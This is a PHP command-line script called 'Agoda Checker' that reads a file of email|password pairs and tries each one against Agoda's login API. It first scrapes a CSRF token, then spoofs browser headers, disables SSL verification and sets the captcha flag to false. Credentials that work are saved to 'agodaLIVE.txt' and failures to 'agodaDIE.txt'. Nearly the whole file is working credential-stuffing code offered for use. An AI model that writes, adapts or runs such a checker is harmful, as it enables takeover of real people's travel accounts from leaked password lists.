<?php

date_default_timezone_set('Asia/Jakarta');
error_reporting(0);
ini_set('display_errors', 0);
function microtime_float()
{
    list($usec, $sec) = explode(" ", microtime());
    return ((float)$usec + (float)$sec);
}

$url = "https://www.agoda.com/";
	
	$csrf_token_field_name = "requestVerificationToken";
	$token_cookie= realpath("cookie.txt");
	$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); //derek
	curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_COOKIEJAR, $token_cookie);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $token_cookie);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	$response = curl_exec($ch);
	
	//echo $response;
	
if (curl_errno($ch)) die(curl_error($ch));
	libxml_use_internal_errors(true);
	$dom = new DomDocument();
	$dom->loadHTML($response);
	libxml_use_internal_errors(0);
	$tokens = $dom->getElementsByTagName ("input");
	for ($i = 0; $i < $tokens->length; $i++) 
	{
		$meta = $tokens->item($i);
		if($meta->getAttribute('name') == 'requestVerificationToken')
			$t = $meta->getAttribute('value');
    }
    //print_r ($t);
    //echo $t;


    $curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => "https://www.agoda.com/api/login/signin",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 5,
  CURLOPT_COOKIEJAR, $token_cookie,
  CURLOPT_COOKIEFILE, $token_cookie,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  $sss = CURLOPT_POSTFIELDS =>"{\"email\":\"$username\",\"password\":\"$password\",\"pageType\":\"newhome\",\"pageTypeId\":1,\"captcha\":true,\"captchaResponse\":null,\"languageId\":26,\"token\":\"$t\"}",
  CURLOPT_HTTPHEADER => array(
    "authority: www.agoda.com",
    "pragma: no-cache",
    "cache-control: no-cache",
    "origin: https://www.agoda.com",
    "x-requested-with: XMLHttpRequest",
    "user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
    "content-type: application/json; charset=UTF-8",
    "accept: */*",
    "sec-fetch-site: same-origin",
    "sec-fetch-mode: cors",
    "referer: https://www.agoda.com/id-id/?cid=-218",
    "accept-encoding: gzip, deflate, br",
    "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "cookie: $token_cookie",
  ),
));

$response = curl_exec($curl);

curl_close($curl);
//echo $response;

echo "============================================\n";
echo "              Agoda Checker "; 
echo "\n============================================\n";
echo "Created by : \033[92mMr.Jack \n\033[0m\nCredit     : @2020\n";
echo "============================================\n";
echo "Nama File list : ";
$namafile = trim(fgets(STDIN));
$time_start = microtime_float();
$file = "$namafile.txt";
$ndata = array_sum(explode(' ', microtime()));
$baris = count(file($file));
$jumlah= 0; $live=0; $mati=0;
$myfile = fopen("$namafile.txt", "r") or die("Unable to open file!");
while(! feof($myfile)){
$jumlah+=1;
	$path = 'agodaLIVE.txt'; $path2 = 'agodaDIE.txt';
    $fh = fopen($path,"a+"); $fh2 = fopen($path2,"a+");
 
$referrer= trim(fgets($myfile));
list($username,$password)=explode('|',$referrer);	
        
$curl = curl_init();

curl_setopt_array($curl, array(
  CURLOPT_URL => "https://www.agoda.com/api/login/signin",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 50,
  CURLOPT_COOKIEJAR, $token_cookie,
  CURLOPT_COOKIEFILE, $token_cookie,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "POST",
  $sss = CURLOPT_POSTFIELDS =>"{\"email\":\"$username\",\"password\":\"$password\",\"pageType\":\"newhome\",\"pageTypeId\":1,\"captcha\":false,\"captchaResponse\":null,\"languageId\":26,\"token\":\"$t\"}",
  CURLOPT_HTTPHEADER => array(
    "authority: www.agoda.com",
    "pragma: no-cache",
    "cache-control: no-cache",
    "origin: https://www.agoda.com",
    "x-requested-with: XMLHttpRequest",
    "user-agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
    "content-type: application/json; charset=UTF-8",
    "accept: */*",
    "sec-fetch-site: same-origin",
    "sec-fetch-mode: cors",
    "referer: https://www.agoda.com/id-id/?cid=-218",
    "accept-encoding: gzip, deflate, br",
    "accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    "cookie: $token_cookie",
  ),
));

$response = curl_exec($curl);
curl_close($curl);
	    //echo $response;
		$bates = '/"[^"]*"/m';
        $time_end = microtime_float(); $time = $time_end - $time_start;  $nana = substr($time,0,4);	
        $hi = strpos($response,"0");
        //$cap = strpos($response,"");
        //$tul = $hi;	
		//$tulu = $bates --> $hi;
        //$nil = $matches[1][0]; $nama = $matches[5][0]; $sub = $matches[7][0]; $erorr = $matches[3][0];
        //echo $hi;
		if("$hi"){
			echo "[\033[92mLive\033[0m] $username | $password "; $live+=1;			
			if($hi){
			        $hasil="[Live] $username | $password \n";
			        fwrite($fh,$hasil); 
			        fclose($fh);
			}
			else{
				$mati="[DIE] $username | $password \n";
				fwrite($fh2,$mati); 
				fclose($fh2);
			}			
			}
		else { 
		echo "[\033[91mDiee\033[0m] $username | $password "; $mati+=1;
		}
		echo "\033[92m($jumlah/$baris) \033[95m$nana"."s\033[0m\n";
	}
echo "============================================\n";	
echo "Account \033[92mLive:$live \033[0mdan account \033[91mDie:$mati\033[0m";
echo "\nLIVE SAVED ->\033[92magodaLIVE.txt\033[0m\n";	
?>
